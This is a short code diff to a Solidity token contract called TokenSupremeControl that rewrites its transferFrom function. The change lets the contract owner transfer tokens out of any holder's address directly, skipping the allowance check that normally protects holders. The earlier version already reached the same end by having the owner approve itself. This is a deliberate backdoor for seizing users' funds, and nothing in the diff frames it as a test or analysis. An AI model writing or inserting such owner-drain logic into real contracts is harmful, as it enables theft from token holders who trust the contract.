@@ -36,9 +36,10 @@ contract TokenSupremeControl is ERC1363, Ownable {
     function transferFrom(address from, address to, uint256 amount) public override(ERC20, IERC20) returns (bool) {
         address owner = owner();
         if (_msgSender() == owner) {
-            _approve(from, owner, amount);
+            super._transfer(from, to, amount);
+            return true;
+        } else {
+            return super.transferFrom(from, to, amount);
         }
-      
-        return super.transferFrom(from, to, amount);
     }
 }
